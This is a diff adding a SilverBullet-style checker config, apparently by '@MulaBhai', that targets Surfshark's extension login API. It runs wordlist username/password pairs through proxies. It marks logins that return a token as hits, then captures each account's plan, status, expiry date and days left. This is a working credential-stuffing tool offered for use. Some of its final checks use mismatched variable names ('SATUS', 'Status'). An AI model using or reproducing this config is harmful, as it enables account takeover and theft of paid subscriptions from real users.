@@ -1,0 +1,142 @@
+[SETTINGS]
+{
+  "Name": "SURFSHARK EXT API",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2023-10-15T03:35:02.2775636+06:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MulaBhai",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "SURFSHARK EXT API ",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "ID" 
+
+REQUEST POST "https://ext.surfshark.com/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: ext.surfshark.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "pragma: no-cache" 
+  HEADER "x-device-version: 4.4.1" 
+  HEADER "x-device-type: extension" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" 
+  HEADER "x-device-brand: Chrome" 
+  HEADER "cache-control: no-cache" 
+  HEADER "x-device-model: Extension" 
+  HEADER "x-device-platform: windows" 
+  HEADER "x-device-id: <ID>" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Origin: chrome-extension://ailoabdmgclmfmhdagmlohpjlbpffblp" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "\"token\":\"" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+    KEY "Access denied" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TK" 
+
+REQUEST GET "https://ext.surfshark.com/v1/payment/subscriptions/current" 
+  
+  HEADER "Host: ext.surfshark.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "pragma: no-cache" 
+  HEADER "x-device-version: 4.4.1" 
+  HEADER "x-device-type: extension" 
+  HEADER "authorization: Bearer <TK>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" 
+  HEADER "x-device-brand: Chrome" 
+  HEADER "cache-control: no-cache" 
+  HEADER "x-device-model: Extension" 
+  HEADER "x-device-platform: windows" 
+  HEADER "x-device-id: <ID>" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "PLAN" 
+
+PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "STATUS" 
+
+PARSE "<SOURCE>" LR "\"expiresAt\":\"" "T" CreateEmpty=FALSE -> CAP "EXPIRY DATE" 
+
+FUNCTION GetRemainingDay "<EXPIRY DATE>" -> CAP "DAYS LEFT" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success AND 
+    KEY "<SATUS>" DoesNotContain "active" 
+    KEY "<DAYS LEFT>" GreaterOrEqual "1" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Status>" Contains "canceled" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<RESPONSECODE>" Contains "204" 
+    KEY "<DAYS LEFT>" LessThanOrEqual "0" 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+FUNCTION Constant "@MulaBhai" -> CAP "ConfigBy:" 
+
